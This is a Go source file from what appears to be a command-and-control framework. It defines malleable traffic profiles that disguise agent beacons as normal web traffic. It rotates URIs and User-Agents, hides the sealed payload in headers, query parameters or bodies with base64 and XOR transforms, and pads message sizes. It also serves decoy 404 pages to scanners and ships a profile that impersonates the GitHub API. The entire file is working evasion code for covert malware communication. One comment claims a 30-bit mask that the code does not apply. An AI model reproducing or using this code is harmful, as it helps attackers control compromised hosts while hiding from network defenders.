package protocol

// Malleable traffic profile (plan §2.2). One document is baked into the agent
// config and loaded by the HTTP listener; both sides must agree on:
//   - which URI templates the agent may hit ({uuid}/{ts}/{n} placeholders)
//   - where the sealed envelope travels (body | header:<Name> | param:<name>)
//   - how benign responses and 404-camo pages are rendered
// Unknown URIs / bad slots must be indistinguishable from a normal dead link.

import (
	"bytes"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"net/http"
	"strconv"
	"strings"
	"time"
)

// KV is one header line. Value may reference the {ua} placeholder.
type KV struct {
	Key   string `json:"key"`
	Value string `json:"value"`
}

// ResponseProfile renders server replies. Body uses {data} as the envelope slot.
type ResponseProfile struct {
	Status      int    `json:"status,omitempty"`
	ContentType string `json:"content_type,omitempty"`
	Body        string `json:"body,omitempty"`
	Headers     []KV   `json:"headers,omitempty"`    // extra response headers
	UrlBase64   bool   `json:"url_base64,omitempty"` // quote raw-url base64 at {data}
}

// Profile is the wire-traffic disguise document (JSON; human-editable).
type Profile struct {
	Name    string   `json:"name"`
	URIs    []string `json:"uris,omitempty"`    // default ["/submit"]
	Method  string   `json:"method,omitempty"`  // default POST
	Host    string   `json:"host,omitempty"`    // required Host header ("" = any)
	UAPool  []string `json:"ua_pool,omitempty"` // agent rotates per session
	Headers []KV     `json:"headers,omitempty"` // static/synth headers, {ua} allowed
	Data    string   `json:"data,omitempty"`    // "body" | "header:X-Audit" | "param:tid"
	// DataTransform is an ordered pipeline applied to the request payload:
	// base64 | base64url | xor[:NN] | prepend:STR | append:STR | terminate:STR.
	// Decode applies the inverse in reverse order.
	DataTransform []string `json:"data_transform,omitempty"`
	// PadBlock pads the sealed envelope (trailing JSON whitespace) to a
	// multiple of N bytes — length-profile obfuscation (plan P6).
	PadBlock int `json:"pad_block,omitempty"`
	// Zstd compresses the sealed inner JSON before encryption (plan P6):
	// shrinks checkin/result envelopes; the receiver decompresses per the
	// self-describing envelope flag with a bomb cap.
	Zstd      bool            `json:"zstd,omitempty"`
	Response  ResponseProfile `json:"response,omitempty"`
	NotFound  ResponseProfile `json:"not_found,omitempty"`
	SleepMS   int             `json:"sleep_ms,omitempty"` // defaults handed at registration (0 = listener default)
	JitterPct int             `json:"jitter_pct,omitempty"`
}

const (
	DataBody   = "body"
	dataHeader = "header:"
	dataParam  = "param:"
)

// DefaultProfile is the M0 plain shape (kept for backward-compatible configs).
func DefaultProfile() *Profile {
	return &Profile{Name: "generic", URIs: []string{"/submit"}, Method: http.MethodPost, Data: DataBody}
}

// BuiltIn templates for the demo/console (plan §2.2 malleable list).
func BuiltinProfiles() []*Profile {
	return []*Profile{
		DefaultProfile(),
		{
			Name:   "github-api",
			URIs:   []string{"/app/installations/{n}/access_tokens", "/repos/{uuid}/events"},
			Method: http.MethodPost,
			Data:   "header:X-GitHub-Request-Id",
			UAPool: []string{
				"octokit.js/1.0.0 Node.js/18",
				"curl/8.4.0",
			},
			Headers: []KV{
				{Key: "Accept", Value: "application/vnd.github+json"},
				{Key: "X-GitHub-Api-Version", Value: "2022-11-28"},
				{Key: "User-Agent", Value: "{ua}"},
			},
			Response: ResponseProfile{
				Status: http.StatusCreated, ContentType: "application/json; charset=utf-8",
				Body: `{"id":{n},"url":"https://api.github.com/repos/{uuid}","data":{data},"verified":true}`,
			},
			NotFound: ResponseProfile{
				Status: http.StatusNotFound, ContentType: "application/json; charset=utf-8",
				Body: `{"message":"Not Found","documentation_url":"https://docs.github.com/rest"}`,
			},
			SleepMS: 5000, JitterPct: 30,
		},
	}
}

// Validate checks the profile shape; called at load and listener creation.
func (p *Profile) Validate() error {
	if len(p.URIs) == 0 {
		p.URIs = []string{"/submit"}
	}
	for _, u := range p.URIs {
		if !strings.HasPrefix(u, "/") {
			return fmt.Errorf("profile: uri must start with /: %q", u)
		}
		for _, seg := range strings.Split(u, "/") {
			if strings.HasPrefix(seg, "{") && strings.HasSuffix(seg, "}") {
				switch seg[1 : len(seg)-1] {
				case "uuid", "ts", "n":
				default:
					return fmt.Errorf("profile: unknown placeholder %s", seg)
				}
			}
		}
	}
	if p.Method == "" {
		p.Method = http.MethodPost
	}
	switch {
	case p.Data == "" || p.Data == DataBody:
		p.Data = DataBody
	case strings.HasPrefix(p.Data, dataHeader), strings.HasPrefix(p.Data, dataParam):
		if len(p.Data) <= len(dataHeader) {
			return errors.New("profile: data slot missing name")
		}
	default:
		return fmt.Errorf("profile: bad data slot %q", p.Data)
	}
	if p.Host != "" && strings.ContainsAny(p.Host, " \t\r\n/") {
		return fmt.Errorf("profile: bad host %q", p.Host)
	}
	for _, tr := range p.DataTransform {
		if err := validateTransform(tr); err != nil {
			return err
		}
	}
	if p.PadBlock != 0 && (p.PadBlock < 64 || p.PadBlock > 64<<10) {
		return errors.New("profile: pad_block must be 0 or 64..65536")
	}
	if strings.Contains(p.Response.Body, "{data}") && p.Response.Body != "" {
		// ok: sealed envelope embedded
	} else if p.Response.Body == "" {
		p.Response.Body = "{data}" // raw default (M0 behaviour)
	}
	if p.NotFound.Status == 0 {
		p.NotFound = ResponseProfile{
			Status: http.StatusNotFound, ContentType: "text/html; charset=utf-8",
			Body: "<html><body><h1>404 Not Found</h1></body></html>",
		}
	}
	return nil
}

// MatchPath reports whether an incoming path fits any URI template.
func (p *Profile) MatchPath(path string) bool {
	for _, tmpl := range p.URIs {
		if matchPath(tmpl, path) {
			return true
		}
	}
	return false
}

func matchPath(tmpl, path string) bool {
	ts, ps := strings.Split(tmpl, "/"), strings.Split(path, "/")
	if len(ts) != len(ps) {
		return false
	}
	for i := range ts {
		if strings.HasPrefix(ts[i], "{") && strings.HasSuffix(ts[i], "}") {
			if !placeholderMatch(ts[i][1:len(ts[i])-1], ps[i]) {
				return false
			}
			continue
		}
		if ts[i] != ps[i] {
			return false
		}
	}
	return true
}

func placeholderMatch(kind, got string) bool {
	switch kind {
	case "uuid":
		if len(got) < 8 || len(got) > 64 {
			return false
		}
		for _, c := range got {
			if !strings.ContainsRune("0123456789abcdef", c) {
				return false
			}
		}
		return true
	case "ts", "n":
		if len(got) == 0 || len(got) > 19 {
			return false
		}
		for _, c := range got {
			if c < '0' || c > '9' {
				return false
			}
		}
		return true
	}
	return false
}

// PickURI returns a fresh request path with placeholders randomized (agent side).
func (p *Profile) PickURI() string {
	tmpl := p.URIs[0]
	if len(p.URIs) > 1 {
		tmpl = p.URIs[randIntn(len(p.URIs))]
	}
	out := strings.ReplaceAll(tmpl, "{uuid}", randHex(8))
	out = strings.ReplaceAll(out, "{ts}", strconv.FormatInt(time.Now().Unix(), 10))
	return strings.ReplaceAll(out, "{n}", strconv.FormatInt(int64(randN()), 10))
}

// PickUA returns the caller-visible UA for this profile ("" if pool empty).
func (p *Profile) PickUA() string {
	if len(p.UAPool) == 0 {
		return ""
	}
	return p.UAPool[randIntn(len(p.UAPool))]
}

// ApplyAgentRequest decorates an outgoing request: path/headers/UA/data slot.
// body is the sealed envelope (used per Data slot). Returns the request.
func (p *Profile) ApplyAgentRequest(baseURL, ua string, envelope []byte) (*http.Request, error) {
	envelope = p.PadEnvelope(envelope)
	url := strings.TrimRight(baseURL, "/") + p.PickURI()
	payload := envelope
	transformed := len(p.DataTransform) > 0
	if transformed {
		enc, err := p.EncodeData(envelope)
		if err != nil {
			return nil, err
		}
		payload = enc
	}
	req, err := http.NewRequest(p.Method, url, bytes.NewReader(payload))
	if err != nil {
		return nil, err
	}
	switch {
	case p.Data == DataBody:
		req.Header.Set("Content-Type", "application/octet-stream")
	case strings.HasPrefix(p.Data, dataHeader):
		if transformed {
			req.Header.Set(p.Data[len(dataHeader):], string(payload))
		} else {
			req.Header.Set(p.Data[len(dataHeader):], base64Std(envelope))
		}
		req.Body = http.NoBody
	case strings.HasPrefix(p.Data, dataParam):
		q := req.URL.Query()
		if transformed {
			q.Set(p.Data[len(dataParam):], string(payload))
		} else {
			q.Set(p.Data[len(dataParam):], base64Std(envelope))
		}
		req.URL.RawQuery = q.Encode()
		req.Body = http.NoBody
	}
	if p.Host != "" {
		req.Host = p.Host
	}
	if ua != "" {
		req.Header.Set("User-Agent", ua)
	} else if len(p.UAPool) > 0 {
		req.Header.Set("User-Agent", p.UAPool[0])
	}
	for _, h := range p.Headers {
		v := strings.ReplaceAll(h.Value, "{ua}", ua)
		req.Header.Set(h.Key, v)
	}
	return req, nil
}

// PadEnvelope rounds the sealed envelope up to PadBlock with spaces; JSON
// tolerates trailing whitespace, so ReadEnvelope still accepts the result
// while the on-wire length stops leaking the exact payload size (plan P6).
func (p *Profile) PadEnvelope(env []byte) []byte {
	if p.PadBlock < 64 || len(env) == 0 {
		return env
	}
	n := (len(env) + p.PadBlock - 1) / p.PadBlock * p.PadBlock
	out := make([]byte, n)
	copy(out, env)
	for i := len(env); i < n; i++ {
		out[i] = ' '
	}
	return out
}

// Accepts reports whether an inbound request matches the full profile shape
// (method, URI templates, Host, UA pool and required static headers). A data
// slot header is only required to be present; its value is checked by Extract.
func (p *Profile) Accepts(r *http.Request) bool {
	if r.Method != p.Method || !p.MatchPath(r.URL.Path) {
		return false
	}
	if p.Host != "" && r.Host != p.Host {
		return false
	}
	ua := r.UserAgent()
	if len(p.UAPool) > 0 {
		found := false
		for _, u := range p.UAPool {
			if u == ua {
				found = true
				break
			}
		}
		if !found {
			return false
		}
	}
	dataSlot := strings.TrimPrefix(p.Data, dataHeader)
	for _, h := range p.Headers {
		key := http.CanonicalHeaderKey(h.Key)
		vals, present := r.Header[key]
		switch {
		case key == "Host":
			if h.Value != "" && h.Value != r.Host {
				return false
			}
		case key == "User-Agent":
			if len(p.UAPool) == 0 && h.Value != "" && ua != h.Value {
				return false
			}
		case strings.HasPrefix(p.Data, dataHeader) && key == http.CanonicalHeaderKey(dataSlot):
			if !present || len(vals) == 0 {
				return false
			}
		default:
			if !present {
				return false
			}
			want := strings.ReplaceAll(h.Value, "{ua}", ua)
			if want != "" && (len(vals) == 0 || vals[0] != want) {
				return false
			}
		}
	}
	return true
}

// EncodeData applies the transform pipeline to the request payload.
func (p *Profile) EncodeData(envelope []byte) ([]byte, error) {
	out := append([]byte(nil), envelope...)
	for _, tr := range p.DataTransform {
		name, arg, _ := strings.Cut(tr, ":")
		switch name {
		case "base64":
			out = []byte(base64Std(out))
		case "base64url":
			out = []byte(base64.RawURLEncoding.EncodeToString(out))
		case "xor":
			var k byte = 0xff
			if arg != "" {
				v, err := strconv.ParseUint(strings.TrimPrefix(arg, "0x"), 16, 8)
				if err != nil {
					return nil, fmt.Errorf("profile: xor key %q: %w", arg, err)
				}
				k = byte(v)
			}
			for i := range out {
				out[i] ^= k
			}
		case "prepend":
			out = append([]byte(arg), out...)
		case "append", "terminate":
			out = append(out, arg...)
		default:
			return nil, fmt.Errorf("profile: unknown transform %q", tr)
		}
	}
	return out, nil
}

// DecodeData reverses the transform pipeline (inverse steps, reverse order).
func (p *Profile) DecodeData(in []byte) ([]byte, error) {
	out := append([]byte(nil), in...)
	for i := len(p.DataTransform) - 1; i >= 0; i-- {
		name, arg, _ := strings.Cut(p.DataTransform[i], ":")
		switch name {
		case "base64":
			raw, err := base64.StdEncoding.DecodeString(string(out))
			if err != nil {
				return nil, fmt.Errorf("profile: base64: %w", err)
			}
			out = raw
		case "base64url":
			raw, err := base64.RawURLEncoding.DecodeString(string(out))
			if err != nil {
				if raw, err2 := base64.StdEncoding.DecodeString(string(out)); err2 == nil {
					out = raw
					continue
				}
				return nil, fmt.Errorf("profile: base64url: %w", err)
			}
			out = raw
		case "xor":
			var k byte = 0xff
			if arg != "" {
				v, err := strconv.ParseUint(strings.TrimPrefix(arg, "0x"), 16, 8)
				if err != nil {
					return nil, fmt.Errorf("profile: xor key %q: %w", arg, err)
				}
				k = byte(v)
			}
			for j := range out {
				out[j] ^= k
			}
		case "prepend":
			if !bytes.HasPrefix(out, []byte(arg)) {
				return nil, errors.New("profile: prepend prefix mismatch")
			}
			out = out[len(arg):]
		case "append", "terminate":
			if !bytes.HasSuffix(out, []byte(arg)) {
				return nil, errors.New("profile: append suffix mismatch")
			}
			out = out[:len(out)-len(arg)]
		default:
			return nil, fmt.Errorf("profile: unknown transform %q", p.DataTransform[i])
		}
	}
	return out, nil
}

func validateTransform(tr string) error {
	name, arg, hasArg := strings.Cut(tr, ":")
	switch name {
	case "base64", "base64url":
	case "xor":
		if hasArg {
			if _, err := strconv.ParseUint(strings.TrimPrefix(arg, "0x"), 16, 8); err != nil {
				return fmt.Errorf("profile: xor key %q", arg)
			}
		}
	case "prepend", "append":
		if !hasArg {
			return fmt.Errorf("profile: transform %q needs a value", name)
		}
	case "terminate":
		if !hasArg {
			return errors.New("profile: terminate needs a suffix")
		}
	default:
		return fmt.Errorf("profile: unknown transform %q", tr)
	}
	return nil
}

// Extract pulls the envelope bytes out of an inbound request per the data slot.
func (p *Profile) Extract(r *http.Request, maxBody int64) ([]byte, error) {
	transformed := len(p.DataTransform) > 0
	switch {
	case p.Data == DataBody:
		raw, err := readLimited(r.Body, maxBody)
		if err != nil {
			return nil, err
		}
		if transformed {
			return p.DecodeData(raw)
		}
		return raw, nil
	case strings.HasPrefix(p.Data, dataHeader):
		raw := r.Header.Get(p.Data[len(dataHeader):])
		if transformed {
			return p.DecodeData([]byte(raw))
		}
		return base64Decode(raw)
	case strings.HasPrefix(p.Data, dataParam):
		raw := r.URL.Query().Get(p.Data[len(dataParam):])
		if transformed {
			return p.DecodeData([]byte(raw))
		}
		return base64Decode(raw)
	}
	return nil, errors.New("profile: no data slot")
}

// WriteResponse renders a benign response carrying the envelope JSON.
// Raw mode (Body=="{data}") writes it as-is; templated responses embed it as
// a quoted base64 token at {data}.
func (p *Profile) WriteResponse(w http.ResponseWriter, envelope []byte) {
	st := p.Response.Status
	if st == 0 {
		st = http.StatusOK
	}
	ct := p.Response.ContentType
	if ct == "" {
		for _, h := range p.Response.Headers {
			if strings.EqualFold(h.Key, "Content-Type") {
				ct = h.Value
				break
			}
		}
	}
	if ct == "" {
		ct = "application/json"
	}
	w.Header().Set("Content-Type", ct)
	for _, h := range p.Response.Headers {
		w.Header().Set(h.Key, h.Value)
	}
	w.WriteHeader(st)
	if p.rawResponse() {
		_, _ = w.Write(envelope)
		return
	}
	token := base64Std(envelope)
	if p.Response.UrlBase64 {
		token = base64.RawURLEncoding.EncodeToString(envelope)
	}
	body := strings.ReplaceAll(p.Response.Body, "{data}", `"`+token+`"`)
	_, _ = w.Write([]byte(expandTemplate(body, "")))
}

func (p *Profile) rawResponse() bool {
	b := p.Response.Body
	return b == "" || b == "{data}"
}

// ParseResponse recovers the envelope from a server reply (agent side).
// It scans quoted base64 tokens of the template output and accepts the first
// that decodes into a valid envelope, so authors may place {data} anywhere
// (and randomize other fields freely) without breaking the agent.
func (p *Profile) ParseResponse(body []byte) (*Envelope, error) {
	if p.rawResponse() {
		return ReadEnvelope(body)
	}
	for _, tok := range b64Tokens(body) {
		raw, err := decodeB64Any(tok)
		if err != nil {
			continue
		}
		if env, err := ReadEnvelope(raw); err == nil {
			return env, nil
		}
	}
	return nil, errors.New("profile: no envelope found in response template output")
}

func decodeB64Any(tok string) ([]byte, error) {
	for _, enc := range []*base64.Encoding{
		base64.StdEncoding, base64.RawStdEncoding, base64.RawURLEncoding, base64.URLEncoding,
	} {
		if raw, err := enc.DecodeString(tok); err == nil {
			return raw, nil
		}
	}
	return nil, errors.New("profile: not base64")
}

// WriteNotFound renders the camo 404 page (unknown URI, bad slot, junk body).
func (p *Profile) WriteNotFound(w http.ResponseWriter) {
	st := p.NotFound.Status
	if st == 0 {
		st = http.StatusNotFound
	}
	ct := p.NotFound.ContentType
	if ct == "" {
		ct = "text/html; charset=utf-8"
	}
	w.Header().Set("Content-Type", ct)
	for _, h := range p.NotFound.Headers {
		w.Header().Set(h.Key, h.Value)
	}
	w.WriteHeader(st)
	_, _ = w.Write([]byte(expandTemplate(p.NotFound.Body, "")))
}

// expandTemplate fills {uuid}/{ts}/{n}/{data} render slots with benign values.
func expandTemplate(tmpl, data string) string {
	out := strings.ReplaceAll(tmpl, "{data}", data)
	out = strings.ReplaceAll(out, "{uuid}", randHex(12))
	out = strings.ReplaceAll(out, "{ts}", strconv.FormatInt(time.Now().Unix(), 10))
	out = strings.ReplaceAll(out, "{n}", strconv.FormatInt(int64(randN()), 10))
	return out
}

func randHex(n int) string {
	b := make([]byte, n)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}

// randN returns a non-negative value safe as a placeholder number on all
// platforms (masked to 30 bits so it fits int32 on GOARCH=386).
func randN() uint32 {
	b := make([]byte, 4)
	_, _ = rand.Read(b)
	return uint32(b[0])<<24 | uint32(b[1])<<16 | uint32(b[2])<<8 | uint32(b[3])
}

func randIntn(n int) int {
	b := make([]byte, 4)
	_, _ = rand.Read(b)
	return int(uint32(b[0])<<24|uint32(b[1])<<16|uint32(b[2])<<8|uint32(b[3])) % n
}
